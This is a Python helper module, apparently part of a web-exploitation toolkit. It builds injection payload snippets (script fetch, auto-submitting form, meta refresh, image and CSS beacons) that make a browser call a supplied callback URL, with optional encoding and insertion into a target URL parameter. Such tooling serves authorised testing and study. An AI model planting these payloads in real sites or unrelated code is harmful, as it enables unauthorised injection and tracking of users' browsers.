"""Payload snippet helpers for web exploit workflows."""

from __future__ import annotations

import html
import json
from typing import Any
from urllib.parse import quote, urlencode, urlsplit, urlunsplit, parse_qsl

from .browser_actions import redact_url
from .callbacks import redact_sensitive_text
from .sessions import bounded_text


PAYLOAD_TYPES = (
    "img",
    "script-fetch",
    "fetch-post",
    "css-url",
    "markdown-img",
    "meta-refresh",
    "form-autosubmit",
)
ENCODINGS = ("html", "url", "js")


class WebPayloadError(RuntimeError):
    """Raised when payload generation cannot proceed safely."""


def _validate_url(value: str) -> str:
    url = str(value or "").strip()
    parsed = urlsplit(url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise WebPayloadError("callback_url must be an absolute http(s) URL")
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, parsed.query, ""))


def _target_with_param(target_url: str, target_param: str, callback_url: str) -> str:
    parsed = urlsplit(target_url)
    if not parsed.scheme or not parsed.netloc:
        return ""
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    pairs.append((target_param, callback_url))
    return redact_url(urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(pairs), "")))


def _encode_snippet(snippet: str, encoding: str | None) -> str:
    if not encoding:
        return snippet
    if encoding == "html":
        return html.escape(snippet, quote=True)
    if encoding == "url":
        return quote(snippet, safe="")
    if encoding == "js":
        return json.dumps(snippet)
    raise WebPayloadError(f"unsupported encoding: {encoding}")


def generate_web_payloads(
    *,
    callback_url: str,
    types: list[str] | tuple[str, ...] | None = None,
    target_param: str | None = None,
    encode: str | None = None,
    target_url: str | None = None,
) -> dict[str, object]:
    """Return bounded helper payload snippets for a callback URL."""

    callback = _validate_url(callback_url)
    selected = list(types or PAYLOAD_TYPES)
    unsupported = [item for item in selected if item not in PAYLOAD_TYPES]
    if unsupported:
        raise WebPayloadError("unsupported payload type(s): " + ", ".join(sorted(unsupported)))
    if encode and encode not in ENCODINGS:
        raise WebPayloadError(f"unsupported encoding: {encode}")

    html_url = html.escape(callback, quote=True)
    js_url = json.dumps(callback)
    css_url = callback.replace("\\", "\\\\").replace('"', '\\"')
    snippets = {
        "img": f'<img src="{html_url}" alt="">',
        "script-fetch": f"<script>fetch({js_url},{{mode:'no-cors',credentials:'omit'}})</script>",
        "fetch-post": (
            f"<script>fetch({js_url},"
            "{method:'POST',mode:'no-cors',credentials:'omit',body:'workflow=1'})</script>"
        ),
        "css-url": f'body{{background-image:url("{css_url}")}}',
        "markdown-img": f"![callback]({callback})",
        "meta-refresh": f'<meta http-equiv="refresh" content="0;url={html_url}">',
        "form-autosubmit": (
            f'<form action="{html_url}" method="POST">'
            '<input type="hidden" name="workflow" value="1"></form>'
            "<script>document.forms[0].submit()</script>"
        ),
    }

    payloads: list[dict[str, Any]] = []
    for payload_type in selected:
        snippet = snippets[payload_type]
        encoded = _encode_snippet(snippet, encode)
        record: dict[str, Any] = {
            "type": payload_type,
            "helper": True,
            "encoding": encode or "",
            "snippet": encoded,
            "snippet_preview": bounded_text(redact_sensitive_text(encoded), max_bytes=1000),
        }
        if target_param:
            record["target_param"] = str(target_param)
            record["target_param_assignment"] = urlencode({str(target_param): callback})
            if target_url:
                record["target_url_with_param"] = _target_with_param(str(target_url), str(target_param), callback)
        payloads.append(record)

    return {
        "ok": True,
        "callback_url": callback,
        "callback_url_redacted": redact_url(callback),
        "payloads": payloads,
        "count": len(payloads),
        "note": "helper payloads only; no exploit solver, browser submission, or tunnel provider is invoked",
    }
